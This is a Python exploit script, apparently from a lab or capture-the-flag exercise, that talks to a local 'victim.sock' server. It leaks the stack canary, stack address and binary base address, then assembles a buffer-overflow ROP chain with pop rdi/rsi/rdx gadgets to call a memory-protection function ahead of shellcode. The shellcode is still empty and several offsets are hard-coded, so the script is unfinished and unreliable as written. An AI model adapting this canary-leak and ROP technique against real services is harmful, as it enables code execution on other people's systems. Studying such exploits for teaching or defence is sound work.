import socket
import sys
from os.path import expanduser

# Create a UDS socket
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
home = expanduser("~")
server_address = home + '/victim.sock'
print('connecting to {}'.format(server_address))
try:
    sock.connect(server_address)
except socket.error as msg:
    print(msg)
    sys.exit(1)

def zerochecker(bytes, expectedLength):
    while len(bytes) != expectedLength:
        bytes = "0x0" + bytes[2:]
    return bytes

try:

    # Send data for canary
    message = b'AAAAAAAAAAAAAAAAAAAAAAAA\n32\n'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)

    # receive canary back
    while amount_received < amount_expected:
        data = sock.recv(32)
        amount_received += len(data)
        hex_canary = zerochecker(hex(int.from_bytes(data[24:],"little")), 18)
        print("Hex canary read in as:")
        print(hex_canary)
        canary_byte_array = bytearray.fromhex(hex_canary[2:])
        canary_byte_array.reverse()

    # Send data for stack base
    message = b'\n6\n'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)
    while amount_received < amount_expected:
        data = sock.recv(6)
        amount_received += len(data)
        stack_base = zerochecker(hex(int.from_bytes(data,"little")-224), 14)
        print("Stack base read in as:")
        print(stack_base)
        sbase_byte_array = bytearray.fromhex(stack_base[2:])
        sbase_byte_array.reverse()

    # Send data for binary base addr
    message = b'\n280\n'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)
    while amount_received < amount_expected:
        data = sock.recv(280)
        amount_received += len(data)
        binary_base = zerochecker(hex(int.from_bytes(data[272:],"little")), 14)
        print("Binary base read in as:")
        print(binary_base)
        bbase_byte_array = bytearray.fromhex(binary_base[2:])
        bbase_byte_array.reverse()


    shellcode = b"" # need to develop hexcode, put in as bytes, change mem its in to executable, run it

    overflow1 = b"\x00" + b"A" * 23
    # hex_canary and canary_byte_array defined on first request
    # stack_base and sbase_byte_array defined on second request
    # binary_base and bbase_byte_array defined on third request
    overflow2 = b"A" * 8

    # pop rdi; ret
    gadget1 = bytearray.fromhex(hex(int(binary_base, 16) + int("0xf33", 16))[2:])
    gadget1.reverse()
    
    # pop rsi; pop r15; ret
    gadget2 = bytearray.fromhex(hex(int(binary_base, 16) + int("0xf31", 16))[2:])
    gadget2.reverse()
    
    # pop rdx; ret
    gadget3 = bytearray.fromhex(hex(int(binary_base, 16) + int("0xe8f", 16))[2:])
    gadget3.reverse()

    arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - int("0x0", 16))[2:])
    arg_addr.reverse()
    

    arg_len = b"0"  # len of the shellcode as size_t

    arg_prot = b"\x07"  # int, look at man pages (c-level flags)

    #TODO check funcaddr w zerochecker

    funcaddr = hex((int(stack_base, 16) - 0x85D1000) + 0x101830 - 0x208B0) # now in libc, not local binary
    faddr_byte_array = bytearray.fromhex(funcaddr[2:])
    faddr_byte_array.reverse()

    print("funcaddr is:")
    print(funcaddr)

    exploit = overflow1 + canary_byte_array + overflow2 + gadget1 + b"\x00\x00"  + arg_addr + b"\x00\x00"
    exploit += gadget2 + b"\x00\x00" + arg_len + b"\x00"*(16-len(arg_len)) + gadget3 + b"\x00\x00" + arg_prot + b"\x00"*(8-len(arg_prot)) + faddr_byte_array + shellcode

    print("Canary_byte_array before sent:")
    print(canary_byte_array)


    print("faddr_byte_array")
    print(faddr_byte_array)
# Send data
    message = exploit + b"\n1\n" # correct exploit message
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)

    while amount_received < amount_expected:
        data = sock.recv(32)
        amount_received += len(data)
        # if exploit sucessfully makes server exit won't need to print anyhthing anyway

finally:
    print('closing socket')
    sock.close()
